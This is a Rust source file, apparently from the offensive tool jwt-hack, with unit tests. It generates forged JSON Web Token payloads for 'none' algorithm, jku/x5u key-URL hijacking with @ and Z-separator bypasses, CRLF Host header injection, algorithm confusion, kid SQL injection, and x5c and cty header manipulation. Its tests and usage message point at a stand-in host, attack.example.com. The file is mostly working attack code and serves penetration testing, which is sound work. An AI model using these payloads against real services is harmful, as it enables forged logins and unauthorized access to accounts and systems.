use anyhow::Result;
use base64::{engine::general_purpose, Engine as _};
use colored::Colorize;
use log::info;
use serde_json::json;
use std::collections::HashSet;

use crate::jwt;
use crate::utils;

/// Generates different JWT attack payloads based on the given token and parameters
pub fn execute(
    token: &str,
    jwk_trust: Option<&str>,
    jwk_attack: Option<&str>,
    jwk_protocol: &str,
    target: Option<&str>,
) {
    utils::log_info(format!(
        "Generating attack payloads for token: {}",
        utils::format_jwt_token(token)
    ));
    if let Err(e) = generate_payloads(token, jwk_trust, jwk_attack, jwk_protocol, target) {
        utils::log_error(format!("Error generating payloads: {e}"));
        utils::log_error("e.g jwt-hack payload {JWT_CODE} --jwk-attack attack.example.com --jwk-trust trust.example.com --target none,jku,alg_confusion");
    }
}

fn generate_payloads(
    token: &str,
    jwk_trust: Option<&str>,
    jwk_attack: Option<&str>,
    jwk_protocol: &str,
    target: Option<&str>,
) -> Result<()> {
    // Decode JWT token and extract claims
    let decoded = jwt::decode(token)?;
    let _claims_json = serde_json::to_string(&decoded.claims)?;

    // Extract claims part from token
    let token_parts: Vec<&str> = token.split('.').collect();
    if token_parts.len() < 2 {
        return Err(anyhow::anyhow!("Invalid JWT token format"));
    }

    let claims_part = token_parts[1];

    // Parse comma-separated target types into a HashSet
    let targets: HashSet<String> = match target {
        Some(t) => t.split(',').map(|s| s.trim().to_lowercase()).collect(),
        None => HashSet::from(["all".to_string()]),
    };

    // Define list of supported attack target types
    let valid_targets = [
        "all",
        "none",
        "jku",
        "x5u",
        "alg_confusion",
        "kid_sql",
        "x5c",
        "cty",
    ];
    for t in &targets {
        if !valid_targets.contains(&t.as_str()) && t != "all" {
            utils::log_warning(format!(
                "Unknown target type: '{}'. Valid types are: {}",
                t,
                valid_targets.join(", ")
            ));
        }
    }

    let should_generate_all = targets.contains("all");

    // Generate 'none' algorithm attack payloads
    if should_generate_all || targets.contains("none") {
        utils::log_info("Generating 'none' algorithm attack payloads");
        let spinner = utils::start_progress("Creating none algorithm variants...");

        generate_none_payloads(claims_part, "none")?;
        generate_none_payloads(claims_part, "NonE")?;
        generate_none_payloads(claims_part, "NONE")?;

        spinner.finish_and_clear();
    }

    // Generate URL-based attack payloads (jku/x5u) if attack domain is provided
    if let Some(attack_domain) = jwk_attack {
        if should_generate_all || targets.contains("jku") || targets.contains("x5u") {
            utils::log_info(format!(
                "Generating URL-based attack payloads using domain: {}",
                attack_domain.bright_yellow()
            ));
            let spinner = utils::start_progress("Creating JKU and X5U payloads...");

            generate_url_payloads(
                claims_part,
                jwk_trust,
                attack_domain,
                jwk_protocol,
                &targets,
                should_generate_all,
            )?;

            spinner.finish_and_clear();
        }
    } else if should_generate_all || targets.contains("jku") || targets.contains("x5u") {
        utils::log_warning("No attack domain provided. Skipping URL-based payloads.");
        utils::log_info("To generate URL payloads, use --jwk-attack parameter.");
    }

    // Generate algorithm confusion attack payloads (RS256->HS256)
    if should_generate_all || targets.contains("alg_confusion") {
        utils::log_info("Generating algorithm confusion attack payloads");
        let spinner = utils::start_progress("Creating algorithm confusion variants...");

        if let Ok(payloads) = crate::payload::generate_alg_confusion_payload(token, None) {
            for payload in payloads {
                println!(
                    "\n{}",
                    "━━━ Algorithm Confusion Payload (RS256->HS256) ━━━"
                        .bright_cyan()
                        .bold()
                );
                println!("{payload}");
                println!();
            }
        }

        spinner.finish_and_clear();
    }

    // Generate key ID (kid) SQL injection attack payloads
    if should_generate_all || targets.contains("kid_sql") {
        utils::log_info("Generating kid SQL injection attack payloads");
        let spinner = utils::start_progress("Creating kid SQL injection variants...");

        if let Ok(payloads) = crate::payload::generate_kid_sql_payload(token) {
            for payload in payloads {
                println!(
                    "\n{}",
                    "━━━ kid SQL Injection Payload ━━━".bright_cyan().bold()
                );
                println!("{payload}");
                println!();
            }
        }

        spinner.finish_and_clear();
    }

    // Generate x5c certificate header injection attack payloads
    if should_generate_all || targets.contains("x5c") {
        utils::log_info("Generating x5c header injection attack payloads");
        let spinner = utils::start_progress("Creating x5c header injection variants...");

        if let Ok(payloads) = crate::payload::generate_x5c_payload(token) {
            for payload in payloads {
                println!(
                    "\n{}",
                    "━━━ x5c Header Injection Payload ━━━".bright_cyan().bold()
                );
                println!("{payload}");
                println!();
            }
        }

        spinner.finish_and_clear();
    }

    // Generate content type (cty) header manipulation attack payloads
    if should_generate_all || targets.contains("cty") {
        utils::log_info("Generating cty header manipulation attack payloads");
        let spinner = utils::start_progress("Creating cty header variants...");

        if let Ok(payloads) = crate::payload::generate_cty_payload(token) {
            for payload in payloads {
                println!(
                    "\n{}",
                    "━━━ cty Header Manipulation Payload ━━━"
                        .bright_cyan()
                        .bold()
                );
                println!("{payload}");
                println!();
            }
        }

        spinner.finish_and_clear();
    }

    Ok(())
}

/// Creates JWT payloads using 'none' algorithm attack variants with specified claims
fn generate_none_payloads(claims: &str, alg_value: &str) -> Result<()> {
    // Create header with 'none' algorithm variant
    let header = json!({
        "alg": alg_value,
        "typ": "JWT"
    });

    let header_json = serde_json::to_string(&header)?;
    info!("Generate {alg_value} payload header=\"{header_json}\" payload={alg_value}");

    // Base64 encode the header for JWT format
    let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());

    // Format as JWT token without signature (none algorithm attack)
    println!(
        "\n{}",
        format!("━━━ None Algorithm Payload ({alg_value}) ━━━")
            .bright_cyan()
            .bold()
    );
    println!(
        "{}.{}",
        encoded_header.bright_blue(),
        claims.bright_magenta()
    );
    println!();

    Ok(())
}

/// Creates various URL-based attack payloads using JKU/X5U header parameters
fn generate_url_payloads(
    claims: &str,
    jwk_trust: Option<&str>,
    jwk_attack: &str,
    jwk_protocol: &str,
    targets: &HashSet<String>,
    should_generate_all: bool,
) -> Result<()> {
    let mut jku_payloads = Vec::new();

    if should_generate_all || targets.contains("jku") {
        jku_payloads.push(("jku", jwk_attack.to_string()));
    }

    if should_generate_all || targets.contains("x5u") {
        jku_payloads.push(("x5u", jwk_attack.to_string()));
    }

    if jku_payloads.is_empty() {
        return Ok(());
    }

    for (key_type, domain) in jku_payloads {
        // Generate basic URL payload with attack domain
        let header = json!({
            "alg": "hs256",
            key_type: domain,
            "typ": "JWT"
        });

        let header_json = serde_json::to_string(&header)?;
        info!("Generate {key_type} + basic payload header=\"{header_json}\" payload={key_type}");

        let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
        println!(
            "\n{}",
            format!("━━━ JKU/X5U Basic Payload ({key_type}) ━━━")
                .bright_cyan()
                .bold()
        );
        println!(
            "{}.{}",
            encoded_header.bright_blue(),
            claims.bright_magenta()
        );
        println!();

        // If trust domain is provided, generate URL validation bypass payloads
        if let Some(trust_domain) = jwk_trust {
            // Generate Z-separator URL validation bypass payload
            let bypass_z_url = format!("{}://{}{}{}", jwk_protocol, trust_domain, "Z", jwk_attack);
            let header = json!({
                "alg": "hs256",
                key_type: bypass_z_url,
                "typ": "JWT"
            });

            let header_json = serde_json::to_string(&header)?;
            info!(
                "Generate {} host validation payload header=\"{}\" payload={}",
                key_type, header_json, key_type
            );

            let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
            println!(
                "\n{}",
                format!("━━━ Z-Separator Bypass Payload ({}) ━━━", key_type)
                    .bright_cyan()
                    .bold()
            );
            println!(
                "{}.{}",
                encoded_header.bright_blue(),
                claims.bright_magenta()
            );
            println!();

            // Generate @-separator URL validation bypass payload
            let bypass_at_url = format!("{}://{}@{}", jwk_protocol, trust_domain, jwk_attack);
            let header = json!({
                "alg": "hs256",
                key_type: bypass_at_url,
                "typ": "JWT"
            });

            let header_json = serde_json::to_string(&header)?;
            info!(
                "Generate {} host validation payload header=\"{}\" payload={}",
                key_type, header_json, key_type
            );

            let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
            println!(
                "\n{}",
                format!("━━━ @-Separator Bypass Payload ({}) ━━━", key_type)
                    .bright_cyan()
                    .bold()
            );
            println!(
                "{}.{}",
                encoded_header.bright_blue(),
                claims.bright_magenta()
            );
            println!();

            // Generate CRLF-based Host header injection payload
            let crlf_url = format!(
                "{}://{}%0d0aHost: {}",
                jwk_protocol, trust_domain, jwk_attack
            );
            let header = json!({
                "alg": "hs256",
                key_type: crlf_url,
                "typ": "JWT"
            });

            let header_json = serde_json::to_string(&header)?;
            info!(
                "Generate {} host header injection (w/CRLF) payload header=\"{}\" payload={}",
                key_type, header_json, key_type
            );

            let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
            println!(
                "\n{}",
                format!("━━━ CRLF Injection Payload ({}) ━━━", key_type)
                    .bright_cyan()
                    .bold()
            );
            println!(
                "{}.{}",
                encoded_header.bright_blue(),
                claims.bright_magenta()
            );
            println!();
        }
    }

    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::engine::general_purpose;
    use serde_json::json;

    fn create_test_token() -> String {
        // Create a simple header and payload
        let header = json!({
            "alg": "HS256",
            "typ": "JWT"
        });

        let payload = json!({
            "sub": "1234567890",
            "name": "Test User",
            "iat": 1516239022
        });

        // Encode to base64
        let header_encoded = general_purpose::URL_SAFE_NO_PAD.encode(header.to_string().as_bytes());
        let payload_encoded =
            general_purpose::URL_SAFE_NO_PAD.encode(payload.to_string().as_bytes());

        // Create a simple test token
        format!("{}.{}.signature", header_encoded, payload_encoded)
    }

    #[test]
    fn test_execute_no_panic() {
        // Create a test token
        let token = create_test_token();

        // Test with minimal parameters
        let result = std::panic::catch_unwind(|| {
            execute(&token, None, None, "https", None);
        });

        assert!(
            result.is_ok(),
            "execute() should not panic with minimal parameters"
        );
    }

    #[test]
    fn test_execute_with_target_parameters() {
        // Create a test token
        let token = create_test_token();

        // Test with specific target
        let result = std::panic::catch_unwind(|| {
            execute(&token, None, None, "https", Some("none"));
        });

        assert!(
            result.is_ok(),
            "execute() should not panic with 'none' target parameter"
        );
    }

    #[test]
    fn test_execute_with_jwk_parameters() {
        // Create a test token
        let token = create_test_token();

        // Test with JWK parameters
        let result = std::panic::catch_unwind(|| {
            execute(
                &token,
                Some("trust.example.com"),
                Some("attack.example.com"),
                "https",
                Some("jku,x5u"),
            );
        });

        assert!(
            result.is_ok(),
            "execute() should not panic with JWK parameters"
        );
    }

    #[test]
    fn test_execute_with_invalid_token() {
        // Create an invalid token
        let token = "invalid.token";

        // Test with invalid token
        let result = std::panic::catch_unwind(|| {
            execute(token, None, None, "https", None);
        });

        assert!(
            result.is_ok(),
            "execute() should not panic with invalid token"
        );
    }

    #[test]
    fn test_generate_none_payloads() {
        // Create a valid payload part
        let payload_str = "eyJzdWIiOiIxMjM0NTY3ODkwIn0";

        // Test generating none payload
        let result = generate_none_payloads(payload_str, "none");

        assert!(result.is_ok(), "generate_none_payloads should not fail");
    }

    #[test]
    fn test_generate_url_payloads() {
        // Create a valid payload part
        let payload_str = "eyJzdWIiOiIxMjM0NTY3ODkwIn0";

        // Create a set of targets
        let mut targets = HashSet::new();
        targets.insert("jku".to_string());
        targets.insert("x5u".to_string());

        // Test generating url payloads
        let result = generate_url_payloads(
            payload_str,
            Some("trust.example.com"),
            "attack.example.com",
            "https",
            &targets,
            false,
        );

        assert!(result.is_ok(), "generate_url_payloads should not fail");
    }
}
